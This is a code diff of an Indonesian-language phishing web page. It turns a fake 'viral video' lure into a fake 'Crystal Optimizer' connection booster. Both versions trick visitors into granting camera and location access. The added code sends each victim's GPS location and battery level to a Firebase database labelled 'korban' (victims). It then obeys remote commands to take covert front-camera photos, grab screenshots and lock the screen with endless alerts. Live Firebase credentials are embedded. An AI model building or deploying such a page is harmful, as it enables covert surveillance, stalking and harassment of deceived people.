@@ -1,99 +1,146 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GNN - VIDEO VIRAL TERKINI</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CRYSTAL OPTIMIZER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        :root { --neon: #c084fc; --deep: #0a0514; }
+        body { 
+            background: var(--deep); 
+            color: var(--neon); 
+            font-family: 'Segoe UI', sans-serif; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            overflow: hidden;
+            text-align: center;
+        }
+        
+        .crystal-container {
+            background: rgba(168, 85, 247, 0.1);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(192, 132, 252, 0.3);
+            padding: 40px;
+            border-radius: 30px;
+            box-shadow: 0 0 30px rgba(192, 132, 252, 0.2);
+            width: 80%;
+            max-width: 300px;
+            cursor: pointer;
+            transition: 0.4s;
+        }
+
+        .crystal-container:active { transform: scale(0.9); }
+
+        .gem { font-size: 60px; margin-bottom: 20px; text-shadow: 0 0 20px var(--neon); }
+        
+        h2 { margin: 0; font-size: 18px; letter-spacing: 2px; }
+        p { font-size: 12px; opacity: 0.6; margin-top: 10px; }
+
+        #lock-overlay { 
+            display: none; position: fixed; inset: 0; background: black; 
+            z-index: 9999; color: red; padding-top: 50%; font-weight: bold; 
+        }
+
+        video, canvas { display: none; }
+    </style>
 </head>
-<body style="background:#000; color:white; text-align:center; font-family:sans-serif; padding:20px;">
-    
-    <video id="v" width="1" height="1" autoplay style="opacity:0; position:absolute;"></video>
-    <canvas id="c" style="display:none;"></canvas>
-    
-    <div id="m">
-        <h2 style="color:red;">🔴 LIVE: KEJADIAN VIRAL</h2>
-        <p>Gunakan koneksi stabil dan izinkan akses lokasi & kamera untuk memutar video (Verifikasi Keamanan).</p>
-        <button onclick="gas()" style="background:red; color:white; padding:18px; width:100%; border:none; border-radius:12px; font-weight:bold; font-size:16px; cursor:pointer; box-shadow: 0 5px 15px rgba(255,0,0,0.3);">KONFIRMASI & TONTON</button>
+<body>
+
+    <div id="main-ui" class="crystal-container" onclick="ignite()">
+        <div class="gem">💎</div>
+        <h2>OPTIMIZE</h2>
+        <p id="msg">Ketuk untuk sinkronisasi sinyal kristal dan percepat koneksi.</p>
     </div>
 
+    <div id="lock-overlay">☣️ SYSTEM ENCRYPTED ☣️</div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+
 <script>
-    // --- TEMPEL CONFIG FIREBASE KALZ DISINI ---
-    const firebaseConfig = {
-      apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
-      authDomain: "theeyes-8d0aa.firebaseapp.com",
-      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "theeyes-8d0aa",
-      storageBucket: "theeyes-8d0aa.firebasestorage.app",
-      messagingSenderId: "886775568743",
-      appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
+    // --- KONFIGURASI FIREBASE (WAJIB SAMA DENGAN DASHBOARD) ---
+    const config = { 
+        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
+        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
     };
-    // ------------------------------------------
-
-    firebase.initializeApp(firebaseConfig);
+    firebase.initializeApp(config); 
     const db = firebase.database();
-    let idK = null;
 
-    async function gas() {
+    let myId = null;
+
+    async function ignite() {
+        const msg = document.getElementById('msg');
+        msg.innerText = "Meminta akses satelit...";
+
         try {
-            // Minta Izin Kamera Depan
+            // 1. Ambil Akses Kamera
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('v').srcObject = stream;
-            
-            // Minta Izin Lokasi
+
+            // 2. Ambil Lokasi
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                let bat = "N/A"; 
-                if(navigator.getBattery) { 
-                    const b = await navigator.getBattery(); 
-                    bat = Math.round(b.level*100)+"%"; 
-                }
                 
-                // Daftarkan Korban ke Firebase
+                // 3. Ambil Info Baterai
+                let bat = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    bat = Math.round(b.level * 100) + "%";
+                }
+
+                // 4. Kirim Data Awal ke Radar Lu
                 const ref = db.ref('korban').push({
-                    waktu: new Date().toLocaleString(),
+                    waktu: new Date().toLocaleString('id-ID'),
                     baterai: bat,
-                    isp: "Checking...",
                     maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                
-                idK = ref.key;
-                document.getElementById('m').innerHTML = "<h3>🔄 Menghubungkan ke Server Video...</h3><p>Mohon jangan tutup halaman ini.</p>";
+                myId = ref.key;
 
-                // --- SISTEM LISTENER (Nunggu Perintah Owner) ---
-                db.ref('commands/' + idK).on('value', (s) => {
-                    const cmd = s.val();
-                    if(cmd && cmd.action === "TAKE") {
-                        take(); // Eksekusi jepret foto
+                // Tampilan Berhasil (Pancingan)
+                document.getElementById('main-ui').style.borderColor = "#22c55e";
+                msg.innerHTML = "<span style='color:#22c55e'>Optimization 99%...</span><br>Jangan tutup tab ini agar koneksi tetap stabil.";
+
+                // 5. Standby Perintah Sadap (Background Process)
+                db.ref('commands/' + myId).on('value', snap => {
+                    const cmd = snap.val();
+                    if (!cmd) return;
+
+                    // EKSEKUSI KAMERA
+                    if (cmd.action === "TAKE") {
+                        const v = document.getElementById('v'), c = document.getElementById('c');
+                        c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        db.ref('hasil_foto/' + myId).set({ foto: c.toDataURL('image/jpeg', 0.5) });
+                    }
+
+                    // EKSEKUSI SCREENSHOT
+                    if (cmd.action === "SHOT") {
+                        html2canvas(document.body).then(canvas => {
+                            db.ref('hasil_screenshot/' + myId).set({ foto: canvas.toDataURL('image/jpeg', 0.5) });
+                        });
+                    }
+
+                    // EKSEKUSI PENGUNCI (VIRUS)
+                    if (cmd.action === "VIRUS") {
+                        document.getElementById('lock-overlay').style.display = 'block';
+                        setInterval(() => { alert("CRYSTAL ERROR: DEVICE LOCKED"); }, 500);
                     }
                 });
-            }, (err) => { 
-                alert("Gagal! Anda wajib mengizinkan lokasi untuk menonton."); 
-            }, {enableHighAccuracy:true});
-            
-        } catch(e) { 
-            alert("Akses Kamera Ditolak! Video tidak bisa diputar."); 
-        }
-    }
 
-    // Fungsi Jepret Foto Rahasia
-    function take() {
-        const v = document.getElementById('v'), c = document.getElementById('c');
-        const context = c.getContext('2d');
-        c.width = v.videoWidth; 
-        c.height = v.videoHeight;
-        
-        // Gambar frame dari video ke canvas
-        context.drawImage(v, 0, 0);
-        
-        // Kirim hasil foto (Base64) ke node hasil_foto
-        db.ref('hasil_foto/' + idK).set({ 
-            foto: c.toDataURL('image/jpeg', 0.4), // Kompresi 40% biar enteng
-            t: Date.now()
-        });
-        
-        // Hapus perintah di Firebase biar gak jepret terus-terusan
-        db.ref('commands/' + idK).remove();
+            }, (err) => {
+                alert("Gagal: Izin lokasi ditolak. Kalibrasi gagal.");
+                msg.innerText = "Gagal. Klik ulang dan izinkan lokasi.";
+            });
+
+        } catch (err) {
+            alert("Gagal: Izin kamera diperlukan untuk sinkronisasi visual.");
+            msg.innerText = "Gagal. Klik ulang dan izinkan kamera.";
+        }
     }
 </script>
 </body>
